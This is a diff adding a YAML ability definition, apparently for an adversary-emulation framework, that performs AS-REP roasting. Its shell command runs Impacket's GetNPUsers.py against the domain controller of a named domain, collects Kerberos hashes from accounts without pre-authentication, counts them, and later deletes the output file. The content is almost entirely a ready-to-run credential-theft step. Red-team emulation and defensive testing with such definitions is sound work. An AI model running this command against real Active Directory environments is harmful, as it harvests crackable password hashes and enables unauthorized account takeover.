@@ -1,0 +1,16 @@
+- id: ca06-asrep-roast
+  name: AS-REP Roasting Pre-Auth Disabled
+  description: Request AS-REP hashes from accounts with pre-authentication disabled
+  tactic: credential-access
+  technique:
+    attack_id: T1558.004
+    name: Steal or Forge Kerberos Tickets - AS-REP Roasting
+  platforms:
+    linux:
+      sh:
+        command: |
+          GetNPUsers.py cyberstrike.mil/ -no-pass -dc-ip 10.0.20.101 -outputfile /tmp/asrep.txt 2>/dev/null; echo "AS-REP hashes: $(grep -c 'krb5asrep' /tmp/asrep.txt 2>/dev/null)"
+        cleanup: |
+          rm -f /tmp/asrep.txt
+  singleton: false
+  repeatable: false
